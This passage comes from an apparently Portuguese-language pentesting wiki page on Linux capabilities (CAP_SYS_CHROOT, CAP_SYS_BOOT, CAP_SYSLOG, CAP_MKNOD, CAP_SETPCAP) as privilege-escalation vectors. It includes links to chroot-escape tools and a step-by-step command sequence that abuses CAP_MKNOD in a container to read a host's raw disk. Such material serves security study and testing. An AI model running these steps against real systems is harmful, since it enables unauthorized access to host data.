f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```

{% hint style="info" %}
Note que geralmente esse atributo imutável é definido e removido usando:

```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite a execução da chamada de sistema `chroot(2)`, o que potencialmente pode permitir a fuga de ambientes `chroot(2)` por meio de vulnerabilidades conhecidas:

* [Como escapar de várias soluções chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: ferramenta de escape chroot](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) não apenas permite a execução da chamada de sistema `reboot(2)` para reinicializações do sistema, incluindo comandos específicos como `LINUX_REBOOT_CMD_RESTART2` adaptados para certas plataformas de hardware, mas também permite o uso de `kexec_load(2)` e, a partir do Linux 3.17, `kexec_file_load(2)` para carregar novos kernels de falha ou assinados, respectivamente.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) foi separado do mais amplo **CAP\_SYS\_ADMIN** no Linux 2.6.37, concedendo especificamente a capacidade de usar a chamada `syslog(2)`. Essa capacidade permite a visualização de endereços de kernel via `/proc` e interfaces similares quando a configuração `kptr_restrict` está em 1, que controla a exposição de endereços de kernel. Desde o Linux 2.6.39, o padrão para `kptr_restrict` é 0, o que significa que os endereços de kernel são expostos, embora muitas distribuições configurem isso para 1 (ocultar endereços exceto do uid 0) ou 2 (sempre ocultar endereços) por motivos de segurança.

Além disso, **CAP\_SYSLOG** permite acessar a saída do `dmesg` quando `dmesg_restrict` está configurado como 1. Apesar dessas mudanças, **CAP\_SYS\_ADMIN** mantém a capacidade de realizar operações de `syslog` devido a precedentes históricos.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) estende a funcionalidade da chamada de sistema `mknod` além de criar arquivos regulares, FIFOs (named pipes) ou sockets de domínio UNIX. Especificamente permite a criação de arquivos especiais, que incluem:

* **S\_IFCHR**: Arquivos especiais de caractere, que são dispositivos como terminais.
* **S\_IFBLK**: Arquivos especiais de bloco, que são dispositivos como discos.

Essa capacidade é essencial para processos que requerem a capacidade de criar arquivos de dispositivo, facilitando a interação direta com hardware por meio de dispositivos de caractere ou bloco.

É uma capacidade padrão do Docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Essa capacidade permite escalonamento de privilégios (através de leitura total do disco) no host, sob as seguintes condições:

1. Ter acesso inicial ao host (não privilegiado).
2. Ter acesso inicial ao contêiner (privilegiado (EUID 0) e `CAP_MKNOD` efetivo).
3. Host e contêiner devem compartilhar o mesmo espaço de nomes de usuário.

**Passos para Criar e Acessar um Dispositivo de Bloco em um Contêiner:**

1. **No Host como um Usuário Padrão:**

* Determine seu ID de usuário atual com `id`, por exemplo, `uid=1000(standarduser)`.
* Identifique o dispositivo alvo, por exemplo, `/dev/sdb`.

2. **Dentro do Contêiner como `root`:**

```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```

3. **De Volta ao Host:**

```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```

### CAP\_SETPCAP

**CAP\_SETPCAP** permite a um processo **alterar os conjuntos de capacidades** de outro processo, permitindo a adição ou remoção de capacidades dos conjuntos efetivo, herdável e permitido. No entanto, um processo só pode modificar as capacidades que possui em seu próprio conjunto permitido, garantindo que não pode elevar os privilégios de outro processo além dos seus próprios. Atualizações recentes do kernel restringiram essas regras, limitando o `CAP_SETPCAP` a apenas diminuir as capacidades dentro de seu próprio conjunto permitido ou dos conjuntos permitidos de seus descendentes, visando mitigar riscos de segurança. O uso requer ter `CAP_SETPCAP` no conjunto efetivo e as capacidades-alvo no conjunto permitido, utilizando `capset()` para modificações. Isso resume a função principal e as limitações do `CAP_SETPCAP`, destacando seu papel na gestão de privilégios e no aprimoramento da segurança.
